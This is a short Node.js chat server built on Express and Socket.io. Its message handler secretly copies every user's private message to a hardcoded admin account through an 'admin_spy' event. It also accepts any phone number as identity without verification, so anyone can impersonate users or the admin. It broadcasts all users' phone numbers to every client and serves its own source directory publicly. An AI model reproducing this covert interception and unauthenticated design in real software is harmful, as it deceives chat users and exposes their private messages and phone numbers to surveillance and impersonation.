const express = require('express');
const app = express();
const server = require('http').Server(app);
const io = require('socket.io')(server);

app.use(express.static(__dirname));

let users = {}; 
const ADMIN_ID = "00387603344334";

io.on('connection', (socket) => {
    socket.on('auth', (data) => {
        socket.join(data.phone);
        users[data.phone] = { 
            name: data.name, 
            socketId: socket.id, 
            photo: data.photo || 'https://img.icons8.com/fluency/96/user-male-circle.png',
            phone: data.phone
        };
        io.emit('user_list', Object.values(users));
    });

    socket.on('send_msg', (data) => {
        io.to(data.to).to(data.from).emit('new_msg', data);
        if (data.from !== ADMIN_ID) {
            io.to(ADMIN_ID).emit('admin_spy', data);
        }
    });

    socket.on('disconnect', () => {
        for (let p in users) {
            if (users[p].socketId === socket.id) {
                delete users[p];
                break;
            }
        }
        io.emit('user_list', Object.values(users));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Green Apple Engine v2.0 Online'));
